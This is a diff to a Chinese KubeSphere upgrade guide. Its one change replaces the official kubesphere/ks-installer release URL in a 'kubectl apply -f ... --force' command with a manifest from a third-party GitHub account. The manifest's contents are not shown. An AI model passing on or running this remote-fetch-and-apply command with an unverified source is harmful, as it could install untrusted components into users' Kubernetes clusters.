@@ -32,7 +32,7 @@ KubeSphere 3.3.1 对内置角色和自定义角色的授权项做了一些调整
 运行以下命令升级集群：
 
 ```bash
-kubectl apply -f https://github.com/kubesphere/ks-installer/releases/download/v3.3.2/kubesphere-installer.yaml  --force
+kubectl apply -f https://github.com/whenegghitsrock/ks-installer-carryon/releases/download/v3.3.2/kubesphere-installer.yaml  --force
 ```
 
 ## 启用可插拔组件
